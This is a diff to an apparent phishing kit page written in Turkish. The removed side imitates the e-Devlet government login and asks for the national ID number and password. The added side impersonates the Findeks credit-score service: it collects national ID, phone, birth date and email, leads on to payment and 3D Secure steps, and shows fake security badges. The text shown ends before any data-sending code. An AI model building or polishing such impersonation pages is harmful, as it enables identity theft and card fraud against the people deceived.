@@ -1,337 +1,943 @@
 <!DOCTYPE html>
-<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="tr"> <![endif]-->
-<!--[if IE 7]><html class="no-js ie7 oldie" lang="tr"><![endif]-->
-<!--[if IE 8]><html class="no-js ie8 oldie" lang="tr"><![endif]-->
-<!--[if gt IE 8]><!-->
-<!--<![endif]-->
-<html lang="tr" data-theme="">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz."/>
-    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet"/>
-    <meta name="robots" content="noindex,nofollow"/>
-    <meta name="theme-color" content="#4284be">
-    <link rel="icon" type="image/png" href="https://cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.png" sizes="196x196">
-    <title>e-Devlet Kapısı</title>
-    <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/login-main.1.9.5.css">
+    <meta name="robots" content="noindex,nofollow">
+    <title>Kredi Notunu Öğren - Findeks</title>
+    <link rel="icon" type="image/png" href="https://www.findeks.com/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            primary:   '#0056A4',
+                            secondary: '#0070cc',
+                            light:     '#e8f1fb',
+                            dark:      '#003d7a',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'system-ui', 'sans-serif'],
+                    }
+                }
+            }
+        };
+    </script>
     <style>
-        .captcha-wrap {
-            display: inline-flex;
+        /* ── Floating label ── */
+        .float-group { position: relative; }
+        .float-group input,
+        .float-group select {
+            padding-top: 1.375rem;
+            padding-bottom: 0.5rem;
+        }
+        .float-label {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 0.875rem;
+            color: #9ca3af;
+            pointer-events: none;
+            transition: all 0.18s ease;
+            white-space: nowrap;
+        }
+        .float-group input:focus ~ .float-label,
+        .float-group input:not(:placeholder-shown) ~ .float-label,
+        .float-group select:focus ~ .float-label,
+        .float-group select:not([value=""]) ~ .float-label {
+            top: 0.6rem;
+            transform: translateY(0);
+            font-size: 0.7rem;
+            color: #0056A4;
+            font-weight: 600;
+        }
+        .float-group input:focus,
+        .float-group select:focus {
+            outline: none;
+            border-color: #0056A4;
+            box-shadow: 0 0 0 3px rgba(0, 86, 164, 0.12);
+        }
+        .float-group input.input-error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
+        }
+
+        /* ── Progress tabs ── */
+        .step-tab {
+            display: flex;
             align-items: center;
-            gap: 8px;
-            background: #f5f5f5;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 4px 12px;
+            gap: 6px;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            transition: all 0.2s;
+            white-space: nowrap;
         }
-        .captcha-wrap canvas {
-            border-radius: 3px;
+        .step-tab.active {
+            background: #0056A4;
+            color: #fff;
         }
-        .captcha-refresh {
-            background: none;
-            border: none;
+        .step-tab.done {
+            background: #e8f1fb;
+            color: #0056A4;
+        }
+        .step-tab.pending {
+            background: transparent;
+            color: #9ca3af;
+        }
+        .step-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+        .step-tab.active  .step-dot { background: rgba(255,255,255,0.7); }
+        .step-tab.done    .step-dot { background: #0056A4; }
+        .step-tab.pending .step-dot { background: #d1d5db; }
+
+        /* ── CAPTCHA canvas ── */
+        #captchaCanvas {
+            border-radius: 6px;
             cursor: pointer;
-            color: #4284be;
-            font-size: 18px;
-            padding: 4px;
+            display: block;
         }
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(255,255,255,0.85);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            gap: 16px;
-        }
-        .loading-overlay.active { display: flex; }
-        .loading-overlay .lds-ring {
-            width: 48px; height: 48px; position: relative;
-        }
-        .loading-overlay .lds-ring div {
-            box-sizing: border-box; display: block; position: absolute;
-            width: 40px; height: 40px; margin: 4px;
-            border: 4px solid #4284be; border-radius: 50%;
-            animation: lds-ring 1.2s cubic-bezier(0.5,0,0.5,1) infinite;
-            border-color: #4284be transparent transparent transparent;
-        }
-        .loading-overlay .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
-        .loading-overlay .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
-        .loading-overlay .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
-        @keyframes lds-ring {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .error-banner {
-            display: none;
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            color: #856404;
-            padding: 10px 16px;
+
+        /* ── Checkbox custom ── */
+        .custom-check {
+            width: 18px; height: 18px;
+            border: 2px solid #d1d5db;
             border-radius: 4px;
-            font-size: 13px;
-            margin-bottom: 16px;
+            flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center;
+            transition: all 0.15s;
+            cursor: pointer;
         }
-        .error-banner.active { display: block; }
+        .custom-check.checked {
+            background: #0056A4;
+            border-color: #0056A4;
+        }
+        .custom-check svg { display: none; }
+        .custom-check.checked svg { display: block; }
+
+        /* ── Loading modal ── */
+        .modal-backdrop {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.55);
+            z-index: 9000;
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(2px);
+        }
+        .modal-backdrop.hidden { display: none; }
+
+        /* ── Spinner ── */
+        .spinner {
+            width: 44px; height: 44px;
+            border: 4px solid rgba(0,86,164,0.15);
+            border-top-color: #0056A4;
+            border-radius: 50%;
+            animation: spin 0.75s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ── Secure badge pulse ── */
+        @keyframes securePulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(16,185,129,0.35); }
+            50%       { box-shadow: 0 0 0 6px rgba(16,185,129,0); }
+        }
+        .secure-pulse { animation: securePulse 2.5s ease-in-out infinite; }
+
+        /* ── Right panel deco ── */
+        .findeks-deco {
+            background: linear-gradient(160deg, #0056A4 0%, #0070cc 35%, #0056A4 60%, #003d7a 100%);
+            position: relative;
+            overflow: hidden;
+        }
+        .findeks-deco::before {
+            content: '';
+            position: absolute; inset: 0;
+            background:
+                radial-gradient(ellipse 80% 60% at 110% 20%, rgba(255,255,255,0.12) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 80% at -10% 80%, rgba(0,30,80,0.35) 0%, transparent 60%);
+            pointer-events: none;
+        }
+        .findeks-deco::after {
+            content: '';
+            position: absolute; inset: 0;
+            background-image: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
+            background-size: 24px 24px;
+            pointer-events: none;
+        }
+
+        /* ── Overlay backdrop ── */
+        body {
+            background: #f0f4f8;
+            font-family: 'Inter', system-ui, sans-serif;
+        }
+        .page-overlay {
+            position: fixed; inset: 0;
+            background: rgba(10,20,40,0.6);
+            z-index: 10;
+            backdrop-filter: blur(4px);
+        }
+        .modal-shell {
+            position: relative;
+            z-index: 20;
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── Scrollbar thin ── */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 99px; }
     </style>
 </head>
-<body data-lang="tr_TR.UTF-8">
-<div class="loading-overlay" id="loadingOverlay">
-    <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-    <span style="color:#555;font-size:14px;">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
-</div>
+<body>
 
-<div class="wrapper">
-    <div class="container">
+<!-- Page overlay (modal backdrop feel) -->
+<div class="page-overlay" aria-hidden="true"></div>
 
-        <header class="header">
-            <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı</h1>
-            <div class="logo">
-                <a href="https://giris.turkiye.gov.tr/Giris/gir">
-                    <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png" alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı">
-                </a>
-            </div>
-            <div class="referrerApp">
-                <img alt="" src="https://sbos.saglik.gov.tr/_next/static/media/aileHekimiLogoSb2.b6f9fbf7.svg" aria-hidden="true" width="165" height="40">
-                <p>Sağlık Bakanlığı Ödeme Sistemi<span>https://sbos.saglik.gov.tr/oauthlogin</span></p>
-            </div>
-        </header>
+<!-- ══════════════════════════════════════════
+     MODAL SHELL
+══════════════════════════════════════════ -->
+<div class="modal-shell">
 
-        <h2 class="visuallyhidden">Giriş Seçenekleri</h2>
-        <nav>
-            <div class="menu">
-                <ul>
-                    <li><a href="#" onclick="return false;" class="active">e-Devlet Şifresi</a></li>
-                    <li><a href="#" onclick="return false;">Elektronik İmza</a></li>
-                    <li><a href="#" onclick="return false;">İnternet Bankacılığı</a></li>
-                    <li class="submenu-dropdown">
-                        <button type="button" id="other_logins_btn" aria-expanded="false" aria-controls="other_logins_menu" aria-haspopup="true">Diğer Yöntemler</button>
-                        <ul class="menu-dropdown-list submenu" aria-label="Diğer Yöntemler" id="other_logins_menu">
-                            <li><a href="#" onclick="return false;">Mobil İmza</a></li>
-                            <li><a href="#" onclick="return false;">T.C. Kimlik Kartı</a></li>
-                        </ul>
-                    </li>
-                </ul>
-            </div>
+    <!-- ── HEADER ── -->
+    <header class="sticky top-0 z-50 bg-white border-b border-gray-100 shadow-sm">
+        <div class="max-w-5xl mx-auto px-4 h-14 flex items-center justify-between gap-4">
 
-            <div id="menu_dropdown_wrapper" class="menu-dropdown-wrapper">
-                <button id="login_type_btn" class="selected" aria-controls="login_type_list" aria-expanded="false">
-                    <span class="visuallyhidden">Seçili Doğrulama Yöntemi</span>
-                    e-Devlet Şifresi
-                </button>
-                <ul id="login_type_list" class="menu-dropdown-list" aria-label="Diğer Doğrulama Yöntemlerinden Birini Seçin">
-                    <li><a href="#" onclick="return false;">e-Devlet Şifresi</a></li>
-                    <li><a href="#" onclick="return false;">Elektronik İmza</a></li>
-                    <li><a href="#" onclick="return false;">İnternet Bankacılığı</a></li>
-                    <li><a href="#" onclick="return false;">Mobil İmza</a></li>
-                    <li><a href="#" onclick="return false;">T.C. Kimlik Kartı</a></li>
-                </ul>
-            </div>
-        </nav>
+            <!-- Findeks logo -->
+            <a href="index.php" class="flex items-center gap-2 flex-shrink-0" aria-label="Findeks Ana Sayfa">
+                <svg width="110" height="28" viewBox="0 0 110 28" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <rect width="28" height="28" rx="6" fill="#0056A4"/>
+                    <path d="M7 8h14M7 14h10M7 20h12" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
+                    <text x="34" y="20" font-family="Inter,sans-serif" font-weight="700" font-size="15" fill="#0056A4">findeks</text>
+                </svg>
+            </a>
 
-        <main>
-            <section>
-                <div class="content">
-                    <p>
-                        T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden devam edebilirsiniz.
-                        <a id="pass_detail_btn" href="javascript:void(0)" aria-haspopup="true">e-Devlet Şifresi Nedir, Nasıl Alınır?</a>
-                    </p>
+            <!-- Title (hidden on mobile) -->
+            <span class="hidden sm:block text-sm font-semibold text-gray-700 tracking-wide">Kredi Notunu Öğren</span>
 
-                    <div class="error-banner" id="errorBanner"></div>
-
-                    <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
-                        <fieldset>
-                            <legend class="visuallyhidden">e-Devlet Şifresi İle Giriş</legend>
-                            <div class="form-row required">
-                                <label for="tridField" class="enforced">T.C. Kimlik No</label>
-                                <div class="form-field fieldGroup">
-                                    <input name="tridField" type="number" inputmode="numeric" class="form-control" id="tridField" value="" autocomplete="off" maxlength="11" title="Kimlik numaranız 11 adet rakamdan oluşmalıdır" aria-label="T. C. Kimlik Numaranızı Girin" required/>
-                                    <div class="keyboard-content" aria-hidden="true">
-                                        <button type="button" tabindex="-1" class="btn-action keyboard-pass virtualKeypad" title="T.C. Kimlik No Sanal Klavye">
-                                            <i class="edkicon-keyboard"></i>
-                                        </button>
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div class="form-row">
-                                <label for="egpField" class="enforced">e-Devlet Şifresi</label>
-                                <div class="form-field fieldGroup">
-                                    <input name="egpField" id="egpField" type="password" class="form-control" autocomplete="off" aria-label="e-Devlet Şifrenizi Girin" required="" aria-describedby="passwordFormNote"/>
-                                    <div class="keyboard-content" aria-hidden="true">
-                                        <button type="button" tabindex="-1" class="btn-action keyboard-pass virtualKeyboard" title="e-Devlet Şifresi Sanal Klavye" aria-hidden="true">
-                                            <i class="edkicon-keyboard"></i>
-                                        </button>
-                                    </div>
-                                    <span class="form-warning hide capsWarning">
-                                        <strong>Dikkat:</strong> Üst Karakter (⇪Caps Lock) tuşunuz açık.
-                                    </span>
-                                    <span id="passwordFormNote" class="form-note" title="Şifre yenileme">
-                                        * e-Devlet
-                                        <a id="pass_help_btn" href="javascript:void(0)" aria-haspopup="true">şifrenizi unutmanız durumunda</a>
-                                        doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.<br/>
-                                    </span>
-                                </div>
-                            </div>
-
-                            <div class="form-row required">
-                                <label for="captchaField" class="enforced">Güvenlik Kodu</label>
-                                <div class="form-field captcha">
-                                    <canvas id="captchaCanvas" width="120" height="40" style="cursor:pointer;" title="Yeni güvenlik kodu için tıklayın"></canvas>
-                                    <i class="edk-icon edkicon-next"></i>
-                                    <input name="captchaField" type="text" required class="form-control" id="captchaField" maxlength="5" title="Güvenlik resmindeki karakterleri giriniz"/>
-                                    <span class="form-note">
-                                        Lütfen resimde gördüğünüz karakterleri yanında bulunan kutuya giriniz.<br>
-                                        Resmi okuyamıyorsanız, üzerine tıklayarak yeni bir tane oluşturabilirsiniz.
-                                    </span>
-                                </div>
-                            </div>
-
-                            <div class="form-row end-item">
-                                <a href="#" class="forgot-pass" onclick="return false;">Şifremi Unuttum</a>
-                            </div>
-
-                            <div class="form-row center-item">
-                                <button onclick="window.location.href='index.php'; return false;" type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
-                                <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">Giriş Yap</button>
-                            </div>
-                        </fieldset>
-                    </form>
+            <!-- Progress tabs — desktop -->
+            <nav class="hidden md:flex items-center gap-1" aria-label="Adımlar">
+                <div class="step-tab active" aria-current="step">
+                    <span class="step-dot"></span>Bilgiler
                 </div>
-            </section>
-        </main>
+                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
+                <div class="step-tab pending">
+                    <span class="step-dot"></span>Paket
+                </div>
+                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
+                <div class="step-tab pending">
+                    <span class="step-dot"></span>Ödeme
+                </div>
+                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
+                <div class="step-tab pending">
+                    <span class="step-dot"></span>3D Secure
+                </div>
+                <svg class="w-3 h-3 text-gray-300 flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 18l6-6-6-6"/></svg>
+                <div class="step-tab pending">
+                    <span class="step-dot"></span>Sonuç
+                </div>
+            </nav>
+
+            <!-- Progress dots — mobile -->
+            <div class="flex md:hidden items-center gap-1.5" aria-label="Adım 1 / 5">
+                <span class="w-2.5 h-2.5 rounded-full bg-brand-primary"></span>
+                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
+                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
+                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
+                <span class="w-2 h-2 rounded-full bg-gray-200"></span>
+            </div>
+
+            <!-- Close button -->
+            <a href="index.php"
+               class="flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center text-gray-400 hover:text-gray-700 hover:bg-gray-100 transition-colors"
+               aria-label="Kapat">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12"/></svg>
+            </a>
+        </div>
+    </header>
+
+    <!-- ── MAIN CONTENT ── -->
+    <main class="flex-1 max-w-5xl mx-auto w-full px-4 py-8 lg:py-12">
+        <div class="flex flex-col lg:flex-row gap-8 lg:gap-10 items-start">
+
+            <!-- ══════════════════════════════════════════
+                 LEFT COLUMN — Form
+            ══════════════════════════════════════════ -->
+            <div class="flex-1 w-full">
+
+                <!-- Section heading -->
+                <div class="mb-7">
+                    <h1 class="text-2xl font-bold text-gray-900 tracking-tight">Bilgileriniz</h1>
+                    <p class="text-sm text-gray-500 mt-1.5 leading-relaxed">
+                        Sürece misafir olarak veya Findeks üyeliğiniz ile devam edebilirsiniz.
+                    </p>
+                </div>
+
+                <!-- Error banner -->
+                <div id="errorBanner"
+                     role="alert"
+                     aria-live="assertive"
+                     class="hidden mb-5 flex items-start gap-3 p-4 bg-red-50 border border-red-200 rounded-xl text-sm text-red-700">
+                    <svg class="w-5 h-5 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+                    <span id="errorText"></span>
+                </div>
+
+                <!-- Form -->
+                <form id="basvuruForm" novalidate autocomplete="off" class="space-y-4">
+
+                    <!-- TC Kimlik No -->
+                    <div class="float-group">
+                        <input
+                            type="text"
+                            id="tcField"
+                            name="tc"
+                            inputmode="numeric"
+                            maxlength="11"
+                            placeholder=" "
+                            autocomplete="off"
+                            aria-label="T.C. Kimlik Numarası"
+                            aria-required="true"
+                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
+                        >
+                        <label for="tcField" class="float-label">T.C. Kimlik Numarası</label>
+                    </div>
+
+                    <!-- Cep Telefonu -->
+                    <div class="float-group">
+                        <input
+                            type="tel"
+                            id="phoneField"
+                            name="phone"
+                            inputmode="tel"
+                            maxlength="14"
+                            placeholder=" "
+                            autocomplete="off"
+                            aria-label="Cep Telefonu"
+                            aria-required="true"
+                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
+                        >
+                        <label for="phoneField" class="float-label">Cep Telefonu</label>
+                    </div>
+
+                    <!-- Doğum Tarihi -->
+                    <div class="float-group">
+                        <input
+                            type="text"
+                            id="birthField"
+                            name="birth"
+                            inputmode="numeric"
+                            maxlength="10"
+                            placeholder=" "
+                            autocomplete="off"
+                            aria-label="Doğum Tarihi (GG/AA/YYYY)"
+                            aria-required="true"
+                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
+                        >
+                        <label for="birthField" class="float-label">Doğum Tarihi (GG/AA/YYYY)</label>
+                    </div>
+
+                    <!-- E-posta -->
+                    <div class="float-group">
+                        <input
+                            type="email"
+                            id="emailField"
+                            name="email"
+                            inputmode="email"
+                            placeholder=" "
+                            autocomplete="off"
+                            aria-label="E-posta Adresi"
+                            aria-required="true"
+                            class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 transition-all"
+                        >
+                        <label for="emailField" class="float-label">E-posta Adresi</label>
+                    </div>
+
+                    <!-- CAPTCHA -->
+                    <div class="bg-gray-50 border border-gray-200 rounded-xl p-4">
+                        <p class="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-3">Güvenlik Doğrulaması</p>
+                        <div class="flex items-center gap-3 mb-3">
+                            <canvas id="captchaCanvas" width="140" height="44" class="rounded-lg border border-gray-200 shadow-sm" title="Yeni kod için tıklayın"></canvas>
+                            <button type="button" id="captchaRefresh"
+                                    aria-label="Yeni güvenlik kodu oluştur"
+                                    class="w-9 h-9 flex items-center justify-center rounded-lg border border-gray-200 bg-white text-gray-400 hover:text-brand-primary hover:border-brand-primary transition-colors">
+                                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
+                            </button>
+                        </div>
+                        <div class="float-group">
+                            <input
+                                type="text"
+                                id="captchaField"
+                                name="captcha"
+                                maxlength="5"
+                                placeholder=" "
+                                autocomplete="off"
+                                aria-label="Güvenlik kodu"
+                                aria-required="true"
+                                class="w-full bg-white border border-gray-200 rounded-xl px-4 py-3 text-sm text-gray-900 tracking-widest transition-all"
+                            >
+                            <label for="captchaField" class="float-label">Güvenlik Kodunu Girin</label>
+                        </div>
+                    </div>
+
+                    <!-- KVKK Checkbox -->
+                    <div class="flex items-start gap-3 pt-1">
+                        <button type="button"
+                                id="kvkkCheckBtn"
+                                role="checkbox"
+                                aria-checked="false"
+                                aria-label="KVKK aydınlatma metnini okudum ve onaylıyorum"
+                                class="custom-check mt-0.5"
+                                onclick="toggleKvkk()">
+                            <svg class="w-3 h-3 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg>
+                        </button>
+                        <input type="hidden" id="kvkkValue" name="kvkk" value="0">
+                        <p class="text-xs text-gray-500 leading-relaxed">
+                            <button type="button" onclick="openKvkkModal()"
+                                    class="text-brand-primary font-semibold hover:underline focus:outline-none">
+                                KVKK Aydınlatma Metni
+                            </button>'ni okudum, kişisel verilerimin işlenmesine ilişkin bilgilendirmeyi anladım ve onaylıyorum.
+                        </p>
+                    </div>
+
+                    <!-- Submit -->
+                    <button type="submit" id="submitBtn"
+                            class="w-full py-3.5 bg-brand-primary hover:bg-brand-secondary text-white font-semibold rounded-xl text-sm transition-all flex items-center justify-center gap-2 shadow-sm hover:shadow-md mt-2">
+                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+                        Devam Et
+                    </button>
+
+                    <!-- Trust row -->
+                    <div class="flex items-center justify-center gap-5 pt-1">
+                        <div class="flex items-center gap-1.5 text-gray-400">
+                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                            <span class="text-[11px]">SSL Şifreli</span>
+                        </div>
+                        <div class="flex items-center gap-1.5 text-gray-400">
+                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+                            <span class="text-[11px]">256-bit Şifreleme</span>
+                        </div>
+                        <div class="flex items-center gap-1.5 text-gray-400">
+                            <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+                            <span class="text-[11px]">KKB Güvenceli</span>
+                        </div>
+                    </div>
+
+                </form>
+            </div>
+
+            <!-- ══════════════════════════════════════════
+                 RIGHT COLUMN — Summary sidebar (desktop)
+            ══════════════════════════════════════════ -->
+            <aside class="findeks-deco hidden lg:flex flex-col w-80 xl:w-96 rounded-2xl p-8 flex-shrink-0" aria-label="Seçiminiz">
+
+                <!-- Panel header -->
+                <div class="mb-6 relative z-10">
+                    <div class="flex items-center gap-3 mb-1">
+                        <div class="w-8 h-8 bg-white/15 rounded-lg flex items-center justify-center backdrop-blur-sm">
+                            <svg class="w-4 h-4 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 12V22H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg>
+                        </div>
+                        <h2 class="text-white font-semibold text-lg">Seçiminiz</h2>
+                    </div>
+                    <p class="text-blue-200/70 text-xs ml-11">Seçtiğiniz paketi aşağıda görebilirsiniz</p>
+                </div>
+
+                <!-- Package card -->
+                <div class="relative z-10 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15 p-5 mb-5">
+                    <div class="flex items-start gap-3">
+                        <div class="w-11 h-11 bg-white/15 rounded-lg flex items-center justify-center flex-shrink-0">
+                            <svg class="w-5 h-5 text-white/80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0020 4.77 5.07 5.07 0 0019.91 1S18.73.65 16 2.48a13.38 13.38 0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 005 4.77a5.44 5.44 0 00-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 009 18.13V22"/></svg>
+                        </div>
+                        <div class="flex-1 min-w-0">
+                            <p class="text-white text-sm font-semibold" id="sidebarPackageName">Kredi Notu Raporu</p>
+                            <p class="text-blue-200/70 text-xs mt-0.5">Findeks Premium Paket</p>
+                        </div>
+                    </div>
+                    <div class="mt-4 pt-4 border-t border-white/15 flex items-center justify-between">
+                        <span class="text-blue-200/80 text-sm">Paket Ücreti</span>
+                        <span class="text-white font-bold text-lg" id="sidebarPackagePrice">₺99,00</span>
+                    </div>
+                </div>
+
+                <!-- Step info -->
+                <div class="relative z-10 space-y-2.5 mb-6">
+                    <div class="flex items-center gap-3">
+                        <div class="w-6 h-6 rounded-full bg-white flex items-center justify-center flex-shrink-0">
+                            <span class="text-brand-primary text-[10px] font-bold">1</span>
+                        </div>
+                        <span class="text-white text-xs font-semibold">Bilgilerinizi girin</span>
+                    </div>
+                    <div class="flex items-center gap-3 opacity-50">
+                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
+                            <span class="text-white text-[10px] font-bold">2</span>
+                        </div>
+                        <span class="text-white text-xs">Paket seçin</span>
+                    </div>
+                    <div class="flex items-center gap-3 opacity-50">
+                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
+                            <span class="text-white text-[10px] font-bold">3</span>
+                        </div>
+                        <span class="text-white text-xs">Ödeme yapın</span>
+                    </div>
+                    <div class="flex items-center gap-3 opacity-50">
+                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
+                            <span class="text-white text-[10px] font-bold">4</span>
+                        </div>
+                        <span class="text-white text-xs">3D Secure doğrulama</span>
+                    </div>
+                    <div class="flex items-center gap-3 opacity-50">
+                        <div class="w-6 h-6 rounded-full bg-white/20 flex items-center justify-center flex-shrink-0">
+                            <span class="text-white text-[10px] font-bold">5</span>
+                        </div>
+                        <span class="text-white text-xs">Raporunuzu görüntüleyin</span>
+                    </div>
+                </div>
+
+                <!-- Secure badge -->
+                <div class="relative z-10 mt-auto">
+                    <div class="secure-pulse flex items-center gap-3 p-4 bg-white/10 backdrop-blur-sm rounded-xl border border-white/15">
+                        <div class="w-10 h-10 bg-emerald-500/20 rounded-lg flex items-center justify-center flex-shrink-0">
+                            <svg class="w-5 h-5 text-emerald-300" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+                        </div>
+                        <div>
+                            <p class="text-white text-xs font-semibold">Güvenli İşlem Garantisi</p>
+                            <p class="text-blue-200/60 text-[10px] mt-0.5">KKB & GlobalSign güvencesiyle korunmaktadır</p>
+                        </div>
+                    </div>
+
+                    <!-- Security badges -->
+                    <div class="flex items-center gap-2 mt-4 justify-center flex-wrap">
+                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
+                            <span class="text-white text-[10px] font-bold tracking-wide">GlobalSign</span>
+                        </div>
+                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
+                            <span class="text-white text-[10px] font-bold tracking-wide">KKB</span>
+                        </div>
+                        <div class="px-3 py-1.5 bg-white/10 rounded-lg border border-white/15 backdrop-blur-sm">
+                            <span class="text-white text-[10px] font-bold tracking-wide">Eyebrand</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Hidden inputs for package data -->
+                <input type="hidden" id="hiddenPackageName"  value="Kredi Notu Raporu">
+                <input type="hidden" id="hiddenPackagePrice" value="99.00">
+
+            </aside>
+
+        </div>
+    </main>
+
